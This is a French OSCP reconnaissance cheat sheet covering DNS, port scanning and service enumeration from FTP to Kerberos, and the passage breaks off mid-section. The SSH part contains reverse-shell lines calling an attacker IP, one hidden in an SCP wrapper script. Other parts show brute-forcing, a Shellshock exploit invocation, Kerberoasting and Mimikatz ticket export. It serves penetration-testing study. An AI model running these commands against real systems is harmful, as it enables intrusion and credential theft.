---
title: "OSCP · Reconnaissance"
description: "Identifier les hôtes, les ports et les services accessibles."
---

# OSCP · Reconnaissance

Identifier les hôtes, les ports et les services accessibles.

## Enregistrement d’un domaine

### Interroger le service WHOIS du registre

Sous Linux avec le client `whois`, cette commande demande la fiche publique d’un domaine français.

```bash
whois afnic.fr
```

### Choisir explicitement le serveur WHOIS

```bash
whois -h whois.nic.fr afnic.fr
```

[Client WHOIS Debian](https://manpages.debian.org/trixie/whois/whois.1.en.html) · [Registre du .fr](https://www.iana.org/domains/root/db/fr.html).

**Paramètres et repères :**
`site:somesite.com` · `site:somesite.com -filetype:html` · `filetype:txt` · `ext:txt`  
`intitle:"somethig"`  

## Énumération DNS

Interroger les enregistrements DNS et identifier les services associés.

<p class="oscp-command-note">Interroger les enregistrements DNS.</p>

```bash
# Résolution du domaine
host example.com

# Enregistrement TXT du domaine
host -t TXT example.com

# Résolution d'un sous-domaine
host www.example.com

# Requête TXT avec un serveur DNS spécifique
nslookup -type=TXT example.com 192.0.2.53

# Résolution en boucle depuis une liste
while IFS= read -r sous_domaine; do [ -n "$sous_domaine" ] && host "${sous_domaine}.example.com"; done < sous_domaines.txt

```

## Scanner les ports

Vérifier les ports et les services de la cible autorisée.

### Netcat

<p class="oscp-command-note">Netcat/Telnet : établir la connexion TCP au service «Netcat».</p>

```bash
nc -nv 192.0.2.10 80

# Utiliser UDP plutôt que TCP
nc -u -nv 192.0.2.10 53

# Attendre une connexion entrante
nc -l 4444

# Rester en écoute après la première connexion
nc -k -l 4444

# TCP Balayage dans la plage de port
nc -nvv -w 1 -z 192.0.2.10 1-1024

# -w est de spécifier le délai de connexion en secondes, ainsi que -z pour spécifier le mode zéro-I/O, qui sert au scan des ports et n'envoie aucune donnée
nc -nv -u -z -w 1 [host] [beginning_port]-[finished_port]

# -u utilise UDP plutôt que TCP.
nc -zvu [host] [port]

# Recevoir un shell inversé sur un port précis
nc -nvlp [listening_port]

```

### Nmap

Vérifier les ports et les services de la cible autorisée.

#### Séquence de scans Nmap pour un premier diagnostic

**Énumération avancée**

<p class="oscp-command-note">Nmap -A : identifier l'OS, les versions, les scripts standards et tracer la route ; enregistrer le scan.</p>

```bash
sudo nmap -A <IP_CIBLE> -oN rapport_avance.txt

```

**Scan SYN de tous les ports TCP (rapide, potentiellement incomplet)**

```bash
sudo nmap -sS -p- --min-rate 1000 --max-retries 1 -T4 <IP_CIBLE>

```

**Alternative de scan rapide**

<p class="oscp-command-note">Scanner tous les ports.</p>

```bash
nmap -p- -T4 -n -Pn <IP_CIBLE> -oN rapport_ports.txt

```

**Seconde alternative de scan rapide**

<p class="oscp-command-note">Nmap : scanner tous les ports TCP avec un débit élevé et enregistrer la sortie grepable.</p>

```bash
sudo nmap -sS --min-rate 5000 -p- -vvv -Pn -n -oG openPorts.txt <IP_CIBLE>

```

**Découverte de tous les ports**

<p class="oscp-command-note">Scanner tous les ports.</p>

```bash
nmap -p- <IP_CIBLE> -oN rapport_ports.txt

```

**Ports les plus courants**

<p class="oscp-command-note">Nmap : scanner un nombre défini de ports parmi les plus fréquents.</p>

```bash
nmap --top-ports 100 192.0.2.10

```

#### Types de scan

Vérifier les ports et les services de la cible autorisée.

**Paramètres et repères :**
`-sU` (scan UDP)  

**Scan combiné TCP SYN et UDP (`-sS -sU`)**

<p class="oscp-command-note">Lancer un scan combiné TCP SYN et UDP. Les résultats UDP peuvent être lents ou ambigus ; `sudo` fournit les privilèges nécessaires aux paquets bruts.</p>

```bash
sudo nmap -sU -sS <IP_CIBLE>

```

```bash
# Examiner les ports UDP
sudo nmap -sU --top-ports 500 -T3 <IP_CIBLE>

```

**Paramètres et repères :**
`-sT` (TCP connect)  

**Connexion TCP complète (TCP Connect, -sT)**

```bash
nmap -sT <IP_CIBLE>

```

**Paramètres et repères :**
`-sS` (SYN)  

**Scan SYN (Stealth Scan, -sS)**

```bash
sudo nmap -sS <IP_CIBLE>

```

**Scan d’un port précis**

```bash
nmap -p 445 192.0.2.10

```

**Paramètres et repères :**
`-sn` (découverte d'hôtes)  

**Découverte d'hôtes sans scan de ports (`-sn`)**

<p class="oscp-command-note">Identifier les hôtes actifs.</p>

```bash
nmap -sn 192.0.2.0/24

```

**20 ports les plus courants**

<p class="oscp-command-note">Nmap : scanner les 20 ports les plus fréquents sur la cible.</p>

```bash
nmap --top-ports 20 <IP_CIBLE>

```

**Paramètres et repères :**
`/usr/share/nmap/nmap-services`  

#### Identifier le système d’exploitation et les services

Vérifier les ports et les services de la cible autorisée.

**Paramètres et repères :**
`-O` (détection du système)  

**Détection du système d'exploitation (`-O`)**

<p class="oscp-command-note">Nmap -O : tenter d'identifier le système d'exploitation par empreinte réseau.</p>

```bash
sudo nmap -O <IP_CIBLE>

```

**Estimation du système d'exploitation (nécessite `-O`)**

```bash
sudo nmap -O --osscan-guess <IP_CIBLE>

```

**Paramètres et repères :**
`-sV` (versions de service)  

**Identification des services ( -sV )**

<p class="oscp-command-note">Identifier les versions des services.</p>

```bash
nmap -sV 192.0.2.10

```

**Bannières de services et traceroute**

<p class="oscp-command-note">Nmap -A : regrouper détection d'OS, versions, scripts NSE et traceroute.</p>

```bash
sudo nmap -A <IP_CIBLE>

```

**Paramètres et repères :**
`-sV` (versions de service)  

#### Enregistrer et exploiter les résultats Nmap

Observer les permissions et la configuration de Windows.

**Paramètres et repères :**
`-oG` (sortie grepable)  

**Sortie au format grepable (-oG)**

<p class="oscp-command-note">Détecter les hôtes actifs et enregistrer le résultat au format grepable.</p>

```bash
nmap -v -sn <RESEAU_CIDR> -oG decouverte.gnmap

```

**Paramètres et repères :**
`-oN` (sortie texte)  

**Analyser le fichier de résultats**

<p class="oscp-command-note">Extraire les adresses des hôtes actifs du fichier Nmap au format grepable.</p>

```bash
awk '/Up$/{print $2}' decouverte.gnmap

```

#### Scripts Nmap (NSE)

Vérifier les ports et les services de la cible autorisée.

**Paramètres et repères :**
`/usr/share/nmap/scripts/`  

**Paramètres et repères :**
`--script`  

**Exécuter un script NSE (--script)**

<p class="oscp-command-note">Nmap : exécuter le script NSE choisi, après avoir lu son aide.</p>

```bash
nmap --script <SCRIPT_NSE> <IP_CIBLE>

```

**Afficher l’aide des scripts NSE**

<p class="oscp-command-note">Afficher l&#x27;aide d&#x27;un script Nmap NSE.</p>

```bash
nmap --script-help smb-os-discovery

```

**Exemple de script**

<p class="oscp-command-note">Nmap (HTTP) : lancer les scripts NSE « http-headers ».</p>

```bash
nmap -p 80 --script http-headers 192.0.2.10

```

**Catégories des scripts NSE**

```bash
nmap --script default 192.0.2.10

```

**Catégories NSE :**
`auth` (authentification) · `broadcast` (diffusion) · `brute` (essais de mots de passe) · `default` (scripts par défaut)  
`discovery` (découverte) · `exploit` (tests d'exploitation) · `fuzzer` (fuzzing) · `malware` (malwares)  
`safe` (non intrusifs selon NSE) · `version` (versions) · `vuln` (vulnérabilités)  

#### Fonctions PowerShell

Observer les permissions et la configuration de Windows.

**Vérifier un port TCP**

<p class="oscp-command-note">Tester une connexion réseau avec PowerShell.</p>

```powershell
Test-NetConnection -ComputerName 192.0.2.10 -Port 445

```

**Exemple de scan de ports**

```text
1..1024 | ForEach-Object { $port = $_; $client = [Net.Sockets.TcpClient]::new(); try { if ($client.ConnectAsync('192.0.2.10', $port).Wait(150)) { "TCP $port ouvert" } } catch {} finally { $client.Dispose() } }

```

#### Inventaire TCP complet

Découvrir les ports TCP puis identifier les services dans le périmètre autorisé.

<p class="oscp-command-note">Inventaire TCP complet.</p>

```bash
sudo nmap -sS -p- -Pn -n -oN rapport_ports.txt <IP_CIBLE>
nmap -sV -sC -p <LISTE_PORTS> -oN rapport_services.txt <IP_CIBLE>
```

#### Contrôle des scripts NSE

Afficher la documentation d'un script puis consulter son comportement avant de l'exécuter.

<p class="oscp-command-note">Contrôle des scripts NSE.</p>

```bash
nmap --script-help <SCRIPT_NSE>
nmap -sV -p <PORT> --script <SCRIPT_NSE> <IP_CIBLE>
```

#### Découverte de plusieurs hôtes

Effectuer un ping sweep sans lancer de scan de ports. Les pare-feu peuvent masquer des hôtes présents.

<p class="oscp-command-note">Découverte de plusieurs hôtes.</p>

```bash
nmap -sn -n 192.0.2.0/24
```

### RustScan

Vérifier les ports et les services de la cible autorisée.

**Utilisation de base de RustScan**

<p class="oscp-command-note">Rechercher rapidement les ports accessibles.</p>

```bash
rustscan -a <IP_CIBLE> -p 1-65535

```

**RustScan + Nmap**

```bash
rustscan -a <IP_CIBLE> -p 1-65535 -- -Pn

```

**Plage de ports précise**

```bash
rustscan -a <IP_CIBLE> -r 1-1000

```

**Régler les délais et la taille des lots**

```bash
rustscan -a <IP_CIBLE> -b 500 -u 5000

```

**Scanner des ports spécifiques seulement**

```bash
rustscan -a <IP_CIBLE> -p 22,80,443

```

**Enregistrer les résultats dans le fichier**

```bash
rustscan -a <IP_CIBLE> -- -oN rapport_rustscan.txt

```

**Scan UDP avec Nmap (RustScan découvre principalement les ports TCP)**

```bash
sudo nmap -sU --top-ports 100 <IP_CIBLE>

```

**Détection de vulnérabilité**

```bash
rustscan -a <IP_CIBLE> -p 1-65535 -- -sV --script vuln

```

**Mode silencieux**

```bash
rustscan -a <IP_CIBLE> -p 1-65535 -g -q

```

**Exclure certains ports**

```bash
rustscan -a <IP_CIBLE> -p 1-65535 --exclude-ports 80,443

```

**Détection du système d’exploitation**

```bash
rustscan -a <IP_CIBLE> -p 1-65535 -- -O

```

**Scan TCP et UDP**

```bash
rustscan -a <IP_CIBLE> -p 1-65535 -- -sS -sU

```

### Découverte d'hôtes avec fping

Vérifier les hôtes répondant à ICMP dans un sous-réseau de laboratoire, sans considérer les non-répondants comme absents.

<p class="oscp-command-note">Découverte d'hôtes avec fping.</p>

```bash
fping -a -g <RESEAU_CIDR> 2>/dev/null
```

## Services par port

Vérifier les ports et les services de la cible autorisée.

### 21: FTP

Transférer ou récupérer des fichiers dans le laboratoire.

<p class="oscp-command-note">Nmap (FTP) : lancer les scripts NSE « ftp-anon, ftp-bounce, ftp-libopie ».</p>

```bash
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst <IP_CIBLE>

```

<p class="oscp-command-note">Ouvrir FTP et tester une connexion anonyme, si elle est autorisée.</p>

```bash
ftp <IP_CIBLE>
# À l'invite « Name », saisir anonymous ; à l'invite du mot de passe, saisir une adresse électronique de test.
# Après connexion, « ls » liste les fichiers distants ; « get fichier.txt » télécharge un fichier autorisé.

```

```bash
# Dans une session FTP déjà ouverte :
ftp> binary
ftp> put fichier.bin

```

<p class="oscp-command-note">Télécharger une ressource distante.</p>

```bash
wget -r 'ftp://<IP_CIBLE>/repertoire/'

# Recherche de fichiers spécifiques
find / -name 'nom_fichier' 2>/dev/null

# Exemple de recherche de fichiers
find / -name 'Settings.*' 2>/dev/null

```

<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur FTP à partir d'un dictionnaire.</p>

```bash
hydra -l <UTILISATEUR> -P liste_mots_de_passe.txt -t 4 ftp://<IP_CIBLE>

```

<p class="oscp-command-note">Ouvrir une session FTP sur le serveur cible.</p>

```bash
ftp -p <IP_CIBLE>

```

#### Accès FTP anonyme

Vérifier si le serveur autorise une connexion anonyme, sans modifier les fichiers distants.

<p class="oscp-command-note">Accès FTP anonyme.</p>

```bash
curl -v 'ftp://anonymous:anonymous@<IP_CIBLE>/'
curl --list-only 'ftp://anonymous:anonymous@<IP_CIBLE>/'
```

### 22: SSH

<p class="oscp-command-note">Nmap (SSH) : lancer les scripts NSE « ssh-hostkey ».</p>

```bash
# Examiner les clés d'hôte annoncées par SSH
nmap -p 22 --script ssh-hostkey <target_ip>

# Énumérer les méthodes d'authentification SSH (ne démontre aucun contournement)
nmap -p 22 --script ssh-auth-methods <target_ip>

# Tester les mots de passe SSH dans le périmètre autorisé
nmap -p 22 --script=ssh-brute --script-args userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,passdb=/usr/share/wordlists/rockyou.txt <target_ip>

# Lister les algorithmes SSH2 proposés (ne détermine pas à lui seul la version du serveur)
nmap -p 22 --script ssh2-enum-algos <IP_CIBLE>

# Examiner les algorithmes SSH anciens
nmap -p 22 --script ssh2-enum-algos,sshv1 <IP_CIBLE>

# Authentification SSH par clé publique
nmap -p 22 --script=ssh-publickey-acceptance --script-args ssh.user=<username>,ssh.privatekey=<path_to_private_key> <target_ip>

```

<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur SSH à partir d'un dictionnaire.</p>

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target_ip> -t 4 ssh

hydra -L <user_list> -p <password> <target_ip> -t 4 ssh -s <port>

hydra -f -V -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 22 [IP] ssh

```

<p class="oscp-command-note">Modifier les permissions d&#x27;un fichier.</p>

```bash
chmod 600 cle_privee
ssh -i cle_privee <UTILISATEUR>@<IP_CIBLE>

```

```bash
puttygen cle_putty.ppk -O private-openssh -o cle_privee

```

<p class="oscp-command-note">Préparer une empreinte de clé SSH pour John.</p>

```bash
ssh2john cle_privee > cle_privee.hash

john --wordlist=/usr/share/wordlists/rockyou.txt cle_privee.hash

```

<p class="oscp-command-note">Localiser les clés SSH et les fichiers associés.</p>

```bash
find /etc/ssh -type f -name '*.pub' 2>/dev/null

find "$HOME/.ssh" -type f -name 'id_*' 2>/dev/null

```

<p class="oscp-command-note">Préparer une empreinte de clé SSH pour John.</p>

```bash
# Extraire le hash d'une clé privée chiffrée (inutile si elle n'a pas de phrase secrète)
ssh2john cle_privee > cle_privee.hash

# Tester une authentification SSH par clé (un refus peut avoir plusieurs causes)
ssh <user>@<target_ip> -p <port> -i <private_key_file> # Error message: Permission denied (publickey,password).

```

<p class="oscp-command-note">Transférer des fichiers via SSH.</p>

```bash
# Récupérer un fichier distant vers la machine locale
scp user@remote_host:/path/to/remote/file /path/to/local/destination
scp user@192.168.1.10:/etc/config.txt /home/user/config.txt

# Récupérer plusieurs fichiers distants vers la machine locale
scp user@remote_host:/path/to/remote/file1 /path/to/remote/file2 /local/destination/
scp user@192.168.1.10:/etc/config.txt user@192.168.1.10:/etc/passwd /home/user/

# Récupérer récursivement un répertoire distant
scp -r user@remote_host:/path/to/remote/directory /local/destination/
scp -r user@192.168.1.10:/var/www/html /home/user/

# Récupérer un fichier avec un port SSH non standard (option -P majuscule)
scp -P 2222 user@remote_host:/path/to/remote/file /local/destination/
scp -P 2222 user@192.168.1.10:/etc/config.txt /home/user/

# Télécharger un fichier utilisant une clé privée
scp -i /path/to/private_key user@remote_host:/path/to/remote/file /local/destination/
scp -i ~/.ssh/id_rsa user@192.168.1.10:/etc/config.txt /home/user/

# Télécharger les fichiers avec Verbose Output
scp -v user@remote_host:/path/to/remote/file /local/destination/
scp -v user@192.168.1.10:/etc/config.txt /home/user/

# Télécharger le fichier sans clé d'hôte Vérification, pour contourner la clé d'hôte vérification (pas recommandé pour des environnements sécurisés)
scp -o StrictHostKeyChecking=no user@remote_host:/path/to/remote/file /local/destination/
scp -o StrictHostKeyChecking=no user@192.168.1.10:/etc/config.txt /home/user/

```

```bash
# Envoyer un fichier local vers la machine distante
scp /path/to/local/file user@remote_host:/path/to/remote/destination
scp /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Envoyer plusieurs fichiers locaux vers la machine distante
scp /path/to/local/file1 /path/to/local/file2 user@remote_host:/remote/destination/
scp /home/user/config.txt /home/user/passwd user@192.168.1.10:/etc/

# Envoyer un répertoire local vers la machine distante
scp -r /path/to/local/directory user@remote_host:/path/to/remote/destination/
scp -r /home/user/html user@192.168.1.10:/var/www/

# Envoyer un fichier avec un port SSH non standard (option -P majuscule)
scp -P 2222 /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -P 2222 /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Télécharger un fichier en utilisant une clé privée
scp -i /path/to/private_key /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -i ~/.ssh/id_rsa /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Télécharger des fichiers avec Verbose Output
scp -v /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -v /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Télécharger le fichier sans vérification de clé d'hôte, pour contourner la vérification de clé d'hôte (pas recommandé pour des environnements sécurisés)
scp -o StrictHostKeyChecking=no /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -o StrictHostKeyChecking=no /home/user/config.txt user@192.168.1.10:/etc/config.txt

```

**Sécurité SSH :** `accept-new` accepte automatiquement une nouvelle empreinte, mais refuse une empreinte modifiée. Vérifier l'empreinte par un canal fiable avant toute première connexion sensible.  

<p class="oscp-command-note">Ouvrir une connexion SSH.</p>

```bash
ssh -o StrictHostKeyChecking=accept-new <UTILISATEUR>@<IP_CIBLE>

```

**Paramètres et repères :**
`aes128-cbc`  

```bash
# Algorithme CBC ancien : peut être refusé par les configurations modernes.
ssh -c aes128-cbc user@target_ip

```

**Compatibilité SSH :** le protocole SSH version 2 est utilisé par défaut sur les clients OpenSSH modernes. L'option `-1` (SSH version 1) n'est plus prise en charge par les versions récentes.  

```bash
# Ouvrir une session SSH
ssh user@target_ip

```

**Paramètres et repères :**
`diffie-hellman-group1-sha1` (échange de clés SSH ancien) · `ssh-rsa` (clé SSH RSA ancienne)  

<p class="oscp-command-note">Tester les algorithmes SSH anciens.</p>

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa <user>@<target_ip> -t 'bash -i >& /dev/tcp/<attacker_ip>/443 0>&1'

nc -nvlp [listening_port]

```

<p class="oscp-command-note">Ouvrir une connexion SSH.</p>

```bash
ssh user@target_ip 'whoami'

```

<p class="oscp-command-note">SSH : exemple de traitement des sous-commandes à partir de SSH_ORIGINAL_COMMAND, notamment SCP.</p>

```bash
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    bash -i >& /dev/tcp/<attacker_ip>/443 0>&1
    ;;
esac

```

<p class="oscp-command-note">Transférer des fichiers via SSH.</p>

```bash
scp -i <private_key_file> scp_wrapper.sh <user>@<target_ip>:/home/<user>/

nc -nlvp [listening_port]

```

<p class="oscp-command-note">Se connecter avec une clé SSH privée.</p>

```bash
ssh -i <private_key_file> <user>@<target_ip>

```

### 23: Telnet

<p class="oscp-command-note">Tester la connexion à un port TCP.</p>

```bash
# Connexion de base
telnet <IP_CIBLE> 23

# Se connecter avec un nom d'utilisateur précis
telnet -l <UTILISATEUR> <IP_CIBLE>

```

### 25: SMTP

<p class="oscp-command-note">Nmap (SMTP) : lancer les scripts NSE « smtp-commands, smtp-enum-users, smtp-vuln-cve2010-4344 ».</p>

```bash
# Analyse avec les scripts Nmap (NSE)
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 <target_ip>

# Dialogue SMTP manuel avec Netcat ou Telnet (les lignes EHLO et VRFY sont à saisir après connexion)
nc -nv <target_ip> 25
telnet <target_ip> 25
EHLO ALL
VRFY <USER>

# Exemple d'interaction (sortie illustrative)
kali@kali:~$ nc -nv 192.168.123.8 25
(UNKNOWN) [192.168.123.8] 25 (smtp) open
220 mail ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
VRFY test_user
550 5.1.1 <test_user>: Recipient address rejected: User unknown in local recipient table
^C

```

<p class="oscp-command-note">Exemple de sortie pour «SMTP» : ce bloc illustre les réponses, il n'est pas à coller tel quel.</p>

```bash
# Utilisation
kali@kali:~/Desktop$ python3 smtp.py root 192.168.123.8
b'220 mail ESMTP Postfix (Ubuntu)\r\n'
b'252 2.0.0 root\r\n'

kali@kali:~/Desktop$ python3 smtp.py testUser 192.168.123.8
b'220 mail ESMTP Postfix (Ubuntu)\r\n'
b'550 5.1.1 <testUser>: Recipient address rejected: User unknown in local recipient table\r\n'

```

<p class="oscp-command-note">Script Python : implémentation de «SMTP».</p>

```python
import socket
import sys

if len(sys.argv) != 3:
    print("Utilisation : python3 vrfy.py <utilisateur> <ip_cible>")
    sys.exit(1)

# Créer une socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Se connecter au serveur
ip = sys.argv[2]
s.settimeout(10)
s.connect((ip, 25))

# Recevoir la bannière
banner = s.recv(1024)
print(banner)

# Envoyer une requête SMTP VRFY pour l'utilisateur indiqué
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)
print(result)

# Fermer la socket
s.close()

```

<p class="oscp-command-note">Windows : activer le client Telnet puis tester le dialogue SMTP sur le port 25.</p>

```powershell
dism /online /Enable-Feature /FeatureName:TelnetClient

# Interaction Example
C:\Windows\system32>telnet 192.168.123.8 25
220 mail ESMTP Postfix (Ubuntu)
VRFY testUser
550 5.1.1 <testUser>: Recipient address rejected: User unknown in local recipient table
VRFY root
252 2.0.0 root

```

<p class="oscp-command-note">Nmap (HTTP) : lancer les scripts NSE « http-shellshock ».</p>

```bash
# Vérifier une exposition potentielle à Shellshock sur un CGI du laboratoire
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 192.0.2.10
                
# Reference: https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
python2 shellshock.py <target_ip> <username>@<domain> <attacker_ip> 139 <root>@<domain>

# Exemple : python2 shellshock.py 192.168.1.100 emmanuel@domaine.local 192.168.1.50 139 admin@domaine.local

```

#### Capacités SMTP exposées

Identifier les commandes annoncées par le serveur SMTP ; les résultats d'énumération utilisateurs doivent être confirmés.

<p class="oscp-command-note">Capacités SMTP exposées.</p>

```bash
nmap -sV -p 25 --script smtp-commands <IP_CIBLE>
nmap -p 25 --script smtp-enum-users <IP_CIBLE>
```

#### Énumération SMTP par VRFY

`smtp-user-enum` teste l'existence des noms contenus dans un fichier avec la commande SMTP VRFY. Ne pas interpréter un refus comme la preuve que le compte n'existe pas. Voir [la syntaxe Kali](https://www.kali.org/tools/smtp-user-enum/).

<p class="oscp-command-note">Énumération SMTP par VRFY.</p>

```bash
smtp-user-enum -M VRFY -U <FICHIER_UTILISATEURS>.txt -t <IP_CIBLE>
```

#### Énumération SMTP par RCPT

Méthode alternative si VRFY est désactivée. Ce contrôle envoie des requêtes au serveur et doit être limité au périmètre autorisé.

<p class="oscp-command-note">Énumération SMTP par RCPT.</p>

```bash
smtp-user-enum -M RCPT -U <FICHIER_UTILISATEURS>.txt -t <IP_CIBLE>
```

### 53: DNS

Interroger les enregistrements DNS et identifier les services associés.

<p class="oscp-command-note">Nmap (DNS) : lancer les scripts NSE « dns-brute, dns-nsid, dns-recursion ».</p>

```bash
nmap -sU -p 53 --script dns-nsid,dns-recursion <IP_CIBLE>

```

```bash
# Exécuter les scripts NSE sélectionnés
nmap -sU -p 53 --script dns-nsid <IP_CIBLE>

```

<p class="oscp-command-note">Interroger les enregistrements DNS.</p>

```bash
dig @<SERVEUR_DNS> <DOMAINE> AXFR  # Tenter un transfert de zone DNS autorisé
dig @<SERVEUR_DNS> <DOMAINE> ANY  # ANY ne garantit pas le retour de tous les enregistrements
nslookup
> server <dns_server_ip>
> set type=any
> <domain_name>  # Query any records

```

```bash
# Énumérer les enregistrements DNS
dnsrecon -d <DOMAINE> -n <SERVEUR_DNS> -t axfr

dnsenum --enum --dnsserver <SERVEUR_DNS> <DOMAINE>

```

<p class="oscp-command-note">Nmap -sL : demander la résolution DNS des adresses d'une plage sans scanner les ports.</p>

```bash
nmap -sL <RESEAU_CIDR>  # Lister les cibles et tenter leur résolution DNS inverse, sans scanner les ports

```

<p class="oscp-command-note">Interroger les enregistrements DNS.</p>

```bash
dig @<SERVEUR_DNS> <DOMAINE> A +norecurse

```

<p class="oscp-command-note">Résoudre un nom DNS avec PowerShell.</p>

```powershell
Resolve-DnsName -Name <DOMAINE> -Server <SERVEUR_DNS> -DnsOnly

```

#### Enregistrements MX et TXT

Lister les serveurs de messagerie et les informations TXT d'un domaine appartenant au périmètre.

<p class="oscp-command-note">Enregistrements MX et TXT.</p>

```bash
dig @<SERVEUR_DNS> <DOMAINE> MX +noall +answer
dig @<SERVEUR_DNS> <DOMAINE> TXT +noall +answer
```

#### Transfert de zone DNS

Vérifier si un transfert AXFR non autorisé est accepté par le serveur DNS.

<p class="oscp-command-note">Transfert de zone DNS.</p>

```bash
dig @<SERVEUR_DNS> <DOMAINE> AXFR
```

### 69: TFTP

Transférer ou récupérer des fichiers dans le laboratoire.

<p class="oscp-command-note">Nmap (TFTP) : lancer les scripts NSE « tftp-enum ».</p>

```bash
sudo nmap -sU -p 69 --script tftp-enum <IP_CIBLE>

```

```bash
# Utilisation : exécutez le script de dénombrement TFTP pour obtenir un fichier spécifique
./tftp_enum.sh <IP_CIBLE> <FICHIER>
./tftp_enum.sh 192.168.1.10 bootfile.bin  # Exemple sur une cible de laboratoire

```

<p class="oscp-command-note">Script Bash d’énumération TFTP : vérifier la présence d’un fichier connu.</p>

```bash
#!/bin/bash

# Script d'énumération TFTP
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_ip> <filename>"
    exit 1
fi

TARGET_IP=$1
FILENAME=$2

# Tenter de récupérer le fichier du serveur TFTP
echo "Tentative de téléchargement de $FILENAME depuis $TARGET_IP"
tftp "$TARGET_IP" -c get "$FILENAME"

# Vérifiez si le fichier a été récupéré
if [ -f "$FILENAME" ]; then
    echo "Fichier $FILENAME présent localement après la requête TFTP"
else
    echo "Fichier $FILENAME absent : transfert échoué ou fichier indisponible"
fi

```

```bash
# Interroger le service TFTP
tftp <IP_CIBLE> 69
tftp> get <remote_file> <local_file>
tftp> quit

```

```bash
# Interroger le service TFTP
tftp <IP_CIBLE> 69
tftp> put <local_file> <remote_file>
tftp> quit

```

<p class="oscp-command-note">Exécuter la boucle de vérification des hôtes.</p>

```bash
while IFS= read -r fichier; do [ -n "$fichier" ] && tftp <IP_CIBLE> -c get "$fichier"; done < liste_fichiers.txt

```

<p class="oscp-command-note">Transmettre des instructions de téléchargement ou d'envoi à TFTP.</p>

```bash
printf 'get fichier_distant fichier_local\nquit\n' | tftp <IP_CIBLE>
printf 'put fichier_local fichier_distant\nquit\n' | tftp <IP_CIBLE>

```

### 88: Kerberos

Examiner les objets, les droits et les services du domaine.

<p class="oscp-command-note">Nmap (KERBEROS) : lancer les scripts NSE « kerberos-enum-users ».</p>

```bash
# Identifier le service Kerberos sur le port TCP 88
nmap -sV -p 88 <IP_CIBLE>

# Tester l'énumération d'utilisateurs uniquement dans le périmètre autorisé
nmap -p 88 --script krb5-enum-users <IP_CIBLE>

```

<p class="oscp-command-note">Examiner les comptes Kerberos du domaine.</p>

```bash
kerbrute userenum --dc <IP_DC> -d <DOMAINE> liste_utilisateurs.txt
# Variante si le binaire a été téléchargé localement
./kerbrute_linux_amd64 userenum --dc <IP_DC> -d <DOMAINE> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

```

<p class="oscp-command-note">Examiner les comptes sans préauthentification Kerberos.</p>

```bash
impacket-GetNPUsers -dc-ip <IP_DC> -request -usersfile liste_utilisateurs.txt <DOMAINE>/

```

<p class="oscp-command-note">Demander un ticket Kerberos TGT.</p>

```bash
impacket-getTGT -dc-ip <IP_DC> <DOMAINE>/<UTILISATEUR>

```

<p class="oscp-command-note">Analyser des empreintes avec John.</p>

```bash
john --wordlist=liste_mots_de_passe.txt tickets.hash
# Pour les tickets TGS Kerberos de type 23 (RC4-HMAC) uniquement
hashcat -m 13100 tickets_tgs.hash liste_mots_de_passe.txt

```

<p class="oscp-command-note">Kerberos : demander des tickets d'authentification de test.</p>

```bash
# Demander un TGT Kerberos avec des identifiants autorisés
impacket-getTGT -dc-ip <IP_DC> <DOMAINE>/<UTILISATEUR>

# Demander un ticket de service pour un SPN existant avec des identifiants autorisés
impacket-getST -dc-ip <IP_DC> -spn <SERVICE>/<HOTE> <DOMAINE>/<UTILISATEUR>

```

<p class="oscp-command-note">Énumérer les SPN des comptes de service.</p>

```bash
# Extraire les tickets de service pour une attaque hors ligne (offline cracking)
impacket-GetUserSPNs -dc-ip <dc_ip> -outputfile <tickets_file> <domain>/<username>:<password>

# Casser les mots de passe des tickets extraits avec John the Ripper ou Hashcat
john --wordlist=<wordlist> <tickets_file>
# Ou
hashcat -m 13100 <tickets_file> <wordlist>

```

```bash
# Vérifier les identifiants Kerberos
krb5-brute -d <domain> -t <target_ip> -u <username> -p <password_list>

```

<p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>

```bash
# Obtenir un TGT avec un compte autorisé (ceci n'est pas un renouvellement)
impacket-getTGT -dc-ip 192.0.2.10 exemple.local/utilisateur

# Exemples Rubeus à vérifier selon la version : ne pas confondre mot de passe, hash RC4 et délégation
rubeus.exe asktgt /user:<username> /rc4:<password>
rubeus.exe tgtdeleg /user:<username> /rc4:<password>
rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>

```

<p class="oscp-command-note">Analyser les informations d’authentification avec Mimikatz.</p>

```powershell
# Exporter les tickets accessibles avec les droits nécessaires (commande sensible)
mimikatz "sekurlsa::tickets /export"

```

<p class="oscp-command-note">Kerberos : tester les noms de comptes du domaine avec Kerbrute.</p>

```bash
# Énumérer les utilisateurs Kerberos autorisés avec le binaire Kerbrute
kerbrute userenum --dc 192.0.2.10 -d exemple.local utilisateurs.txt

```

<p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>

```bash
# Attention : la commande ci-dessous n'est pas une syntaxe valide de création de Silver Ticket ; se référer à la version de Rubeus utilisée
